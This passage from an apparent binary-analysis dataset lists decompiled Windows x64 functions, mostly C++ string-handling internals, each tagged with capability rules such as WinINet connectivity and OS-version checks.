= *(iVar8 + 0x58);\n        iVar14 = arg3_01 - iVar4;\n        if (0 < iVar14) {\n            if (iVar4 < 0) {\n                iVar14 = arg3_01;\n            }\n            if (*(iVar8 + 0x18) == 0) {\n                fcn.1400733d0(&iStack88, piVar12, iVar14);\n            }\n            else {\n                fcn.1400727d0(&iStack88, 0, *(iStack88 + -0x18), iVar14 * 2);\n                uVar9 = *(iVar8 + 0x18);\n                arg3_00 = *(iVar8 + 0x10);\n                uVar1 = *(iVar8 + 0x24);\n                if (-1 < *(iStack88 + -8)) {\n                    fcn.140072360(&iStack88);\n                }\n                iVar6 = iStack88;\n                iVar7 = fcn.1400b6270(iStack88, uVar1, arg3_00, uVar9);\n                if (-1 < *(iVar6 + -8)) {\n                    fcn.140072360(&iStack88);\n                }\n                uVar11 = *(iStack88 + -0x18);\n                uVar10 = iVar7 - iStack88 >> 1;\n                if (uVar11 < uVar10) {\n                    uVar9 = fcn.1400b7b60(0x14010bcf8, 0x14010bce2, uVar10, uVar11);\n                    fcn.140072a20(aiStack80[0] + -0x18);\n                    do {\n                        fcn.140072a20(iStack88 + -0x18);\n                        uVar9 = fcn.140014f30(uVar9);\n                    } while( true );\n                }\n                fcn.1400744d0(&iStack88, uVar10, uVar11 - uVar10, 0);\n            }\n            iVar4 = *(iVar8 + 0x58);\n        }\n        if (0 < iVar4) {\n            fcn.1400746a0(&iStack88, *(iVar8 + 0x22));\n            if (iVar14 < 0) {\n                fcn.140073280(&iStack88, -iVar14, *(iVar8 + 0x66));\n                fcn.140072fb0(&iStack88, piVar12, arg3_01);\n            }\n            else {\n                fcn.140072fb0(&iStack88, piVar12 + iVar14, *(iVar8 + 0x58));\n            }\n        }\n        uStack152 = uStack176 + *(iStack88 + -0x18);\n        uVar3 = *(arg4 + 0x18) & 0xb0;\n        if ((*(arg4 + 0x18) & 0x200) != 0) {\n            uStack152 = uStack152 + *(iVar8 + 0x30);\n        }\n        aiStack80[0] = fcn.1400723d0(0, 0);\n        fcn.1400743c0(aiStack80, uStack152 * 2);\n        uVar11 = *(arg4 + 0x10);\n        piVar13 = &uStack92;\n        do {\n            if (*piVar13 < 5) {\n    // switch table (5 cases) at 0x14010bd44\n                switch(*piVar13) {\n                case 0:\n                    if (uVar3 == 0x10 && uStack152 < uVar11) {\n                        fcn.140073280(aiStack80, uVar11 - uStack152, in_stack_00000028);\n                    }\n                    break;\n                case 1:\n                    if (uVar3 == 0x10 && uStack152 < uVar11) {\n                        fcn.140073280(aiStack80, uVar11 - uStack152, in_stack_00000028);\n                    }\n                    else {\n                        fcn.1400746a0(aiStack80, in_stack_00000028);\n                    }\n                    break;\n                case 2:\n                    if ((*(arg4 + 0x19) & 2) != 0) {\n                        fcn.140072fb0(aiStack80, *(iVar8 + 0x28), *(iVar8 + 0x30));\n                    }\n                    break;\n                case 3:\n                    if (uStack176 != 0) {\n                        fcn.1400746a0(aiStack80, *puStack160);\n                    }\n                    break;\n                case 4:\n                    fcn.1400730c0(aiStack80, &iStack88);\n                }\n            }\n            piVar13 = piVar13 + 1;\n        } while (piVar13 != &iStack88);\n        if (1 < uStack176) {\n            fcn.140072fb0(aiStack80, puStack160 + 1, uStack176 - 1);\n        }\n        uVar10 = *(aiStack80[0] + -0x18);\n        if (uVar10 < uVar11) {\n            if (uVar3 == 0x20) {\n                fcn.140073280(aiStack80, uVar11 - uVar10, in_stack_00000028);\n                uVar10 = uVar11;\n            }\n            else {\n                fcn.1400727d0(aiStack80, 0, 0, uVar11 - uVar10);\n                uVar10 = uVar11;\n            }\n        }\n        uVar11 = piVar15 & 0xffffffff;\n        if ((piVar15 == '\\0') && (iVar8 = (**(*piVar2 + 0x60))(piVar2, aiStack80[0], uVar10),  uVar10 != iVar8)) {\n            uVar11 = 1;\n        }\n        piVar15 = piVar15 & 0xffffffffffffff00 | uVar11 & 0xff;\n        fcn.140072a20(aiStack80[0] + -0x18);\n        fcn.140072a20(iStack88 + -0x18);\n    }\n    *(arg4 + 0x10) = 0;\n    arg1[1] = piVar15;\n    *arg1 = piVar2;\n    return arg1;\n}\n",
        "token_count": 2294
    },
    "140071ae": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ** fcn.140071ae0(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t arg4)\n\n{\n    uint16_t uVar1;\n    int64_t *piVar2;\n    ulong arg3_00;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int64_t *piVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    ulong *arg1_00;\n    ulong uVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    int16_t *piVar12;\n    int64_t *piVar13;\n    int32_t iVar14;\n    int64_t *piVar15;\n    int64_t arg3_01;\n    uint16_t in_stack_00000028;\n    int16_t **in_stack_00000030;\n    uint64_t uStack176;\n    uint16_t *puStack160;\n    uint64_t uStack152;\n    uint uStack92;\n    int64_t iStack88;\n    int64_t aiStack80 [2];\n    \n    piVar2 = *arg3;\n    piVar15 = arg3[1];\n    piVar5 = fcn.1400b9850(arg4 + 0xd0);\n    iVar6 = fcn.14002c080(0x140108460);\n    piVar13 = *(*(arg4 + 0xd0) + 0x18) + iVar6 * 8;\n    iVar8 = *piVar13;\n    if (iVar8 == 0) {\n        arg1_00 = fcn.1400bc710(0x80);\n        *(arg1_00 + 1) = 0;\n        *arg1_00 = 0x1401188b0;\n        arg1_00[2] = 0;\n        arg1_00[3] = 0;\n        *(arg1_00 + 4) = 0;\n        *(arg1_00 + 0x22) = 0;\n        arg1_00[5] = 0;\n        arg1_00[6] = 0;\n        arg1_00[7] = 0;\n        arg1_00[8] = 0;\n        arg1_00[9] = 0;\n        arg1_00[10] = 0;\n        *(arg1_00 + 0xb) = 0;\n        *(arg1_00 + 0x5c) = 0;\n        *(arg1_00 + 0x7a) = 0;\n        fcn.1400a15e0(arg1_00, arg4 + 0xd0);\n        fcn.1400a38f0(*(arg4 + 0xd0), arg1_00, iVar6);\n        iVar8 = *piVar13;\n    }\n    piVar12 = *in_stack_00000030;\n    if (*piVar12 == *(iVar8 + 100)) {\n        uStack92 = *(iVar8 + 0x60);\n        uStack176 = *(iVar8 + 0x50);\n        puStack160 = *(iVar8 + 0x48);\n        if (*(piVar12 + -0xc) != 0) {\n            piVar12 = piVar12 + 1;\n        }\n    }\n    else {\n        uStack92 = *(iVar8 + 0x5c);\n        puStack160 = *(iVar8 + 0x38);\n        uStack176 = *(iVar8 + 0x40);\n    }\n    iVar6 = (**(*piVar5 + 0x28))(piVar5, 8, piVar12, piVar12 + *(piVar12 + -0xc));\n    arg3_01 = iVar6 - piVar12 >> 1;\n    if (arg3_01 != 0) {\n        iStack88 = fcn.1400723d0(0, 0);\n        fcn.1400743c0(&iStack88, iVar6 - piVar12);\n        iVar4 = *(iVar8 + 0x58);\n        iVar14 = arg3_01 - iVar4;\n        if (0 < iVar14) {\n            if (iVar4 < 0) {\n                iVar14 = arg3_01;\n            }\n            if (*(iVar8 + 0x18) == 0) {\n                fcn.1400733d0(&iStack88, piVar12, iVar14);\n            }\n            else {\n                fcn.1400727d0(&iStack88, 0, *(iStack88 + -0x18), iVar14 * 2);\n                uVar9 = *(iVar8 + 0x18);\n                arg3_00 = *(iVar8 + 0x10);\n                uVar1 = *(iVar8 + 0x24);\n                if (-1 < *(iStack88 + -8)) {\n                    fcn.140072360(&iStack88);\n                }\n                iVar6 = iStack88;\n                iVar7 = fcn.1400b6270(iStack88, uVar1, arg3_00, uVar9);\n                if (-1 < *(iVar6 + -8)) {\n                    fcn.140072360(&iStack88);\n                }\n                uVar11 = *(iStack88 + -0x18);\n                uVar10 = iVar7 - iStack88 >> 1;\n                if (uVar11 < uVar10) {\n                    uVar9 = fcn.1400b7b60(0x14010bcf8, 0x14010bce2, uVar10, uVar11);\n                    fcn.140072a20(aiStack80[0] + -0x18);\n                    do {\n                        fcn.140072a20(iStack88 + -0x18);\n                        uVar9 = fcn.140014f30(uVar9);\n                    } while( true );\n                }\n                fcn.1400744d0(&iStack88, uVar10, uVar11 - uVar10, 0);\n            }\n            iVar4 = *(iVar8 + 0x58);\n        }\n        if (0 < iVar4) {\n            fcn.1400746a0(&iStack88, *(iVar8 + 0x22));\n            if (iVar14 < 0) {\n                fcn.140073280(&iStack88, -iVar14, *(iVar8 + 0x66));\n                fcn.140072fb0(&iStack88, piVar12, arg3_01);\n            }\n            else {\n                fcn.140072fb0(&iStack88, piVar12 + iVar14, *(iVar8 + 0x58));\n            }\n        }\n        uStack152 = uStack176 + *(iStack88 + -0x18);\n        uVar3 = *(arg4 + 0x18) & 0xb0;\n        if ((*(arg4 + 0x18) & 0x200) != 0) {\n            uStack152 = uStack152 + *(iVar8 + 0x30);\n        }\n        aiStack80[0] = fcn.1400723d0(0, 0);\n        fcn.1400743c0(aiStack80, uStack152 * 2);\n        uVar11 = *(arg4 + 0x10);\n        piVar13 = &uStack92;\n        do {\n            if (*piVar13 < 5) {\n    // switch table (5 cases) at 0x14010bd30\n                switch(*piVar13) {\n                case 0:\n                    if (uVar3 == 0x10 && uStack152 < uVar11) {\n                        fcn.140073280(aiStack80, uVar11 - uStack152, in_stack_00000028);\n                    }\n                    break;\n                case 1:\n                    if (uVar3 == 0x10 && uStack152 < uVar11) {\n                        fcn.140073280(aiStack80, uVar11 - uStack152, in_stack_00000028);\n                    }\n                    else {\n                        fcn.1400746a0(aiStack80, in_stack_00000028);\n                    }\n                    break;\n                case 2:\n                    if ((*(arg4 + 0x19) & 2) != 0) {\n                        fcn.140072fb0(aiStack80, *(iVar8 + 0x28), *(iVar8 + 0x30));\n                    }\n                    break;\n                case 3:\n                    if (uStack176 != 0) {\n                        fcn.1400746a0(aiStack80, *puStack160);\n                    }\n                    break;\n                case 4:\n                    fcn.1400730c0(aiStack80, &iStack88);\n                }\n            }\n            piVar13 = piVar13 + 1;\n        } while (piVar13 != &iStack88);\n        if (1 < uStack176) {\n            fcn.140072fb0(aiStack80, puStack160 + 1, uStack176 - 1);\n        }\n        uVar10 = *(aiStack80[0] + -0x18);\n        if (uVar10 < uVar11) {\n            if (uVar3 == 0x20) {\n                fcn.140073280(aiStack80, uVar11 - uVar10, in_stack_00000028);\n                uVar10 = uVar11;\n            }\n            else {\n                fcn.1400727d0(aiStack80, 0, 0, uVar11 - uVar10);\n                uVar10 = uVar11;\n            }\n        }\n        uVar11 = piVar15 & 0xffffffff;\n        if ((piVar15 == '\\0') && (iVar8 = (**(*piVar2 + 0x60))(piVar2, aiStack80[0], uVar10),  uVar10 != iVar8)) {\n            uVar11 = 1;\n        }\n        piVar15 = piVar15 & 0xffffffffffffff00 | uVar11 & 0xff;\n        fcn.140072a20(aiStack80[0] + -0x18);\n        fcn.140072a20(iStack88 + -0x18);\n    }\n    *(arg4 + 0x10) = 0;\n    arg1[1] = piVar15;\n    *arg1 = piVar2;\n    return arg1;\n}\n",
        "token_count": 2297
    },
    "14007236": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140072360(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = *arg1;\n    if (*(iVar1 + -0x18) == 0) {\n        return;\n    }\n    if (**0x14010fc90 == 0) {\n        if (*(iVar1 + -8) < 1) goto code_r0x00014007238e;\n    }\n    else if (*(iVar1 + -8) < 1) {\n        iVar1 = *arg1;\n        goto code_r0x00014007238e;\n    }\n    fcn.1400744d0(arg1, 0, 0, 0);\n    iVar1 = *arg1;\ncode_r0x00014007238e:\n    *(iVar1 + -8) = 0xffffffff;\n    return;\n}\n",
        "token_count": 186
    },
    "1400723d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.1400723d0(int64_t arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    \n    piVar1 = fcn.140072ba0(arg1, 0);\n    if (arg1 != 0) {\n        iVar2 = 0;\n        if (arg1 == 1) {\n            *(piVar1 + 3) = arg2;\n        }\n        else {\n            do {\n                *(piVar1 + iVar2 * 2 + 0x18) = arg2;\n                iVar2 = iVar2 + 1;\n            } while (arg1 != iVar2);\n        }\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = arg1;\n    *(piVar1 + arg1 * 2 + 0x18) = 0;\n    return piVar1 + 3;\n}\n",
        "token_count": 205
    },
    "1400724b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.1400724b0(ushort *arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    ushort *puVar3;\n    int64_t iVar4;\n    \n    if ((arg2 == 0) || (arg1 != NULL)) {\n        arg2 = arg2 - arg1;\n        iVar4 = arg2 >> 1;\n        piVar1 = fcn.140072ba0(iVar4, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar4 == 1) {\n            *(piVar1 + 3) = *arg1;\n        }\n        else if (iVar4 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, arg1, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar4;\n        *(piVar1 + arg2 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x14010acc8;\n    fcn.1400bd270(0x14010acc8);\n    if ((arg2 == 0) || (puVar3 != NULL)) {\n        arg2 = arg2 - puVar3;\n        iVar4 = arg2 >> 1;\n        piVar1 = fcn.140072ba0(iVar4, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar4 == 1) {\n            *(piVar1 + 3) = *puVar3;\n        }\n        else if (iVar4 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar4;\n        *(piVar1 + arg2 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x14010a880;\n    fcn.1400bd270(0x14010a880);\n    if ((arg2 == 0) || (puVar3 != NULL)) {\n        arg2 = arg2 - puVar3;\n        iVar4 = arg2 >> 1;\n        piVar1 = fcn.140072ba0(iVar4, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar4 == 1) {\n            *(piVar1 + 3) = *puVar3;\n        }\n        else if (iVar4 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar4;\n        *(piVar1 + arg2 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x14010bcb0;\n    fcn.1400bd270(0x14010bcb0);\n    if ((arg2 != 0) && (puVar3 == NULL)) {\n        fcn.1400bd270(0x14010acc8);\n        return 0x1401083c0;\n    }\n    arg2 = arg2 - puVar3;\n    iVar4 = arg2 >> 1;\n    piVar1 = fcn.140072ba0(iVar4, 0);\n    piVar2 = piVar1 + 3;\n    if (iVar4 == 1) {\n        *(piVar1 + 3) = *puVar3;\n    }\n    else if (iVar4 != 0) {\n        piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, arg2);\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = iVar4;\n    *(piVar1 + arg2 + 0x18) = 0;\n    return piVar2;\n}\n",
        "token_count": 892
    },
    "14007254": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.140072540(ushort *arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    ushort *puVar3;\n    int64_t iVar4;\n    \n    if ((arg2 == 0) || (arg1 != NULL)) {\n        arg2 = arg2 - arg1;\n        iVar4 = arg2 >> 1;\n        piVar1 = fcn.140072ba0(iVar4, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar4 == 1) {\n            *(piVar1 + 3) = *arg1;\n        }\n        else if (iVar4 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, arg1, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar4;\n        *(piVar1 + arg2 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x14010a880;\n    fcn.1400bd270(0x14010a880);\n    if ((arg2 != 0) && (puVar3 == NULL)) {\n        puVar3 = 0x14010bcb0;\n        fcn.1400bd270(0x14010bcb0);\n        if ((arg2 != 0) && (puVar3 == NULL)) {\n            fcn.1400bd270(0x14010acc8);\n            return 0x1401083c0;\n        }\n        arg2 = arg2 - puVar3;\n        iVar4 = arg2 >> 1;\n        piVar1 = fcn.140072ba0(iVar4, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar4 == 1) {\n            *(piVar1 + 3) = *puVar3;\n        }\n        else if (iVar4 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar4;\n        *(piVar1 + arg2 + 0x18) = 0;\n        return piVar2;\n    }\n    arg2 = arg2 - puVar3;\n    iVar4 = arg2 >> 1;\n    piVar1 = fcn.140072ba0(iVar4, 0);\n    piVar2 = piVar1 + 3;\n    if (iVar4 == 1) {\n        *(piVar1 + 3) = *puVar3;\n    }\n    else if (iVar4 != 0) {\n        piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, arg2);\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = iVar4;\n    *(piVar1 + arg2 + 0x18) = 0;\n    return piVar2;\n}\n",
        "token_count": 681
    },
    "1400725d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.1400725d0(ushort *arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    ushort *puVar3;\n    int64_t iVar4;\n    \n    if ((arg2 == 0) || (arg1 != NULL)) {\n        arg2 = arg2 - arg1;\n        iVar4 = arg2 >> 1;\n        piVar1 = fcn.140072ba0(iVar4, 0);\n        piVar2 = piVar1 + 3;\n        if (iVar4 == 1) {\n            *(piVar1 + 3) = *arg1;\n        }\n        else if (iVar4 != 0) {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, arg1, arg2);\n        }\n        *(piVar1 + 2) = 0;\n        *piVar1 = iVar4;\n        *(piVar1 + arg2 + 0x18) = 0;\n        return piVar2;\n    }\n    puVar3 = 0x14010bcb0;\n    fcn.1400bd270(0x14010bcb0);\n    if ((arg2 != 0) && (puVar3 == NULL)) {\n        fcn.1400bd270(0x14010acc8);\n        return 0x1401083c0;\n    }\n    arg2 = arg2 - puVar3;\n    iVar4 = arg2 >> 1;\n    piVar1 = fcn.140072ba0(iVar4, 0);\n    piVar2 = piVar1 + 3;\n    if (iVar4 == 1) {\n        *(piVar1 + 3) = *puVar3;\n    }\n    else if (iVar4 != 0) {\n        piVar2 = sub.msvcrt.dll_memcpy(piVar2, puVar3, arg2);\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = iVar4;\n    *(piVar1 + arg2 + 0x18) = 0;\n    return piVar2;\n}\n",
        "token_count": 474
    },
    "14007266": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.140072660(ushort *arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int64_t arg1_00;\n    \n    if ((arg2 != 0) && (arg1 == NULL)) {\n        fcn.1400bd270(0x14010acc8);\n        return 0x1401083c0;\n    }\n    arg2 = arg2 - arg1;\n    arg1_00 = arg2 >> 1;\n    piVar1 = fcn.140072ba0(arg1_00, 0);\n    piVar2 = piVar1 + 3;\n    if (arg1_00 == 1) {\n        *(piVar1 + 3) = *arg1;\n    }\n    else if (arg1_00 != 0) {\n        piVar2 = sub.msvcrt.dll_memcpy(piVar2, arg1, arg2);\n    }\n    *(piVar1 + 2) = 0;\n    *piVar1 = arg1_00;\n    *(piVar1 + arg2 + 0x18) = 0;\n    return piVar2;\n}\n",
        "token_count": 265
    },
    "1400727d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.1400727d0(int64_t *arg1, int64_t arg2, int64_t arg3, ushort *arg4)\n\n{\n    ushort *puVar1;\n    ushort *puVar2;\n    int64_t *arg1_00;\n    int64_t arg2_00;\n    int64_t unaff_RSI;\n    ushort in_stack_00000028;\n    \n    arg2_00 = *arg1;\n    if ((arg3 + 0x1ffffffffffffffc) - *(arg2_00 + -0x18) < arg4) {\n        arg1_00 = 0x14010ac41;\n        fcn.1400bd360(0x14010ac41);\n        fcn.1400744d0(arg1_00, arg2_00, arg3, unaff_RSI);\n        if (unaff_RSI != 0) {\n            puVar1 = *arg1_00 + arg2_00 * 2;\n            if (unaff_RSI == 1) {\n                *puVar1 = *arg4;\n                return arg1_00;\n            }\n            sub.msvcrt.dll_memcpy(puVar1, arg4, unaff_RSI * 2);\n        }\n        return arg1_00;\n    }\n    fcn.1400744d0(arg1, arg2, arg3, arg4);\n    if (arg4 == NULL) {\n        return arg1;\n    }\n    puVar1 = *arg1 + arg2 * 2;\n    puVar2 = NULL;\n    if (arg4 != 0x1) {\n        do {\n            puVar1[puVar2] = in_stack_00000028;\n            puVar2 = puVar2 + 1;\n        } while (arg4 != puVar2);\n        return arg1;\n    }\n    *puVar1 = in_stack_00000028;\n    return arg1;\n}\n",
        "token_count": 424
    },
    "140072b3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.140072b30(int64_t *arg1, ulong arg2, int64_t arg3)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    \n    piVar1 = fcn.140072ba0(*arg1 + arg3, arg1[1]);\n    iVar3 = *arg1;\n    piVar2 = piVar1 + 3;\n    if (iVar3 != 0) {\n        if (iVar3 == 1) {\n            *(piVar1 + 3) = *(arg1 + 3);\n        }\n        else {\n            piVar2 = sub.msvcrt.dll_memcpy(piVar2, arg1 + 3, iVar3 * 2);\n            iVar3 = *arg1;\n        }\n    }\n    *piVar1 = iVar3;\n    *(piVar1 + 2) = 0;\n    *(piVar1 + iVar3 * 2 + 0x18) = 0;\n    return piVar2;\n}\n",
        "token_count": 231
    },
    "140072ba": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.140072ba0(uint64_t arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    char *arg1_00;\n    int64_t iVar3;\n    \n    if (arg1 < 0x1ffffffffffffffd) {\n        if (arg2 < arg1) {\n            if (arg1 < arg2 * 2) {\n                arg1 = arg2 * 2;\n            }\n            iVar2 = arg1 * 2 + 0x1a;\n            uVar1 = arg1 * 2 + 0x3a;\n            if ((uVar1 < 0x1001) || (arg1 <= arg2)) {\n                if (-1 < iVar2) goto code_r0x000140072c09;\n                fcn.1400bd170();\n                goto code_r0x000140072c2a;\n            }\n            arg1 = arg1 + (0x1000 - (uVar1 & 0xfff) >> 1);\n            if (0x1ffffffffffffffc < arg1) {\n                arg1 = 0x1ffffffffffffffc;\n            }\n        }\n        iVar2 = arg1 * 2 + 0x1a;\ncode_r0x000140072c09:\n        iVar2 = fcn.1400bc710(iVar2);\n        *(iVar2 + 8) = arg1;\n        *(iVar2 + 0x10) = 0;\n        return iVar2;\n    }\ncode_r0x000140072c2a:\n    arg1_00 = \"basic_string::_S_create\";\n    fcn.1400bd360(\"basic_string::_S_create\");\n    iVar2 = *arg1_00;\n    iVar3 = *(iVar2 + -0x18) + -1;\n    if ((*(iVar2 + -8) < 0) || (*(iVar2 + -0x18) == 0)) {\n        return iVar2 + iVar3 * 2;\n    }\n    if (**0x14010fc90 == 0) {\n        if (*(iVar2 + -8) < 1) goto code_r0x000140072c85;\n    }\n    else if (*(iVar2 + -8) < 1) {\n        iVar2 = *arg1_00;\n        goto code_r0x000140072c85;\n    }\n    fcn.1400744d0(arg1_00, 0, 0, 0);\n    iVar2 = *arg1_00;\ncode_r0x000140072c85:\n    *(iVar2 + -8) = 0xffffffff;\n    return iVar2 + iVar3 * 2;\n}\n",
        "token_count": 588
    },
    "1400744d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400744d0(int64_t *arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    int32_t *piVar1;\n    int64_t iVar2;\n    ushort *puVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uint64_t arg2_00;\n    ushort *puVar7;\n    int64_t iVar8;\n    uint64_t arg1_00;\n    \n    piVar1 = *0x14010fc90;\n    iVar8 = *arg1;\n    iVar2 = arg3 + arg2;\n    arg2_00 = *(iVar8 + -0x10);\n    arg1_00 = (arg4 - arg3) + *(iVar8 + -0x18);\n    iVar5 = *(iVar8 + -0x18) - iVar2;\n    if (arg1_00 <= arg2_00) {\n        if (**0x14010fc90 == 0) {\n            if (*(iVar8 + -8) < 1) {\ncode_r0x000140074613:\n                if ((iVar5 != 0) && (arg4 != arg3)) {\n                    puVar7 = iVar8 + iVar2 * 2;\n                    puVar3 = iVar8 + (arg4 + arg2) * 2;\n                    if (iVar5 == 1) {\n                        *puVar3 = *puVar7;\n                    }\n                    else {\n                        sub.msvcrt.dll_memmove(puVar3, puVar7, iVar5 * 2);\n                        iVar8 = *arg1;\n                    }\n                }\n                goto code_r0x000140074594;\n            }\n        }\n        else {\n            if (*(iVar8 + -8) < 1) {\n                iVar8 = *arg1;\n                goto code_r0x000140074613;\n            }\n            arg2_00 = *(*arg1 + -0x10);\n        }\n    }\n    iVar6 = fcn.140072ba0(arg1_00, arg2_00);\n    puVar7 = *arg1;\n    iVar8 = iVar6 + 0x18;\n    if (arg2 == 0) {\ncode_r0x000140074577:\n        if (iVar5 == 0) goto code_r0x00014007457c;\ncode_r0x0001400745c0:\n        puVar3 = iVar6 + 0x18 + (arg4 + arg2) * 2;\n        if (iVar5 == 1) {\n            *puVar3 = puVar7[iVar2];\n            goto code_r0x00014007457c;\n        }\n        sub.msvcrt.dll_memcpy(puVar3, puVar7 + iVar2, iVar5 * 2);\n        puVar7 = *arg1;\n        if (*piVar1 != 0) goto code_r0x0001400745ed;\ncode_r0x000140074584:\n        iVar4 = *(puVar7 + -4);\n        *(puVar7 + -4) = iVar4 + -1;\n    }\n    else {\n        if (arg2 != 1) {\n            sub.msvcrt.dll_memcpy(iVar8, puVar7, arg2 * 2);\n            puVar7 = *arg1;\n            goto code_r0x000140074577;\n        }\n        *(iVar6 + 0x18) = *puVar7;\n        if (iVar5 != 0) goto code_r0x0001400745c0;\ncode_r0x00014007457c:\n        if (*piVar1 == 0) goto code_r0x000140074584;\ncode_r0x0001400745ed:\n        LOCK();\n        piVar1 = puVar7 + -4;\n        iVar4 = *piVar1;\n        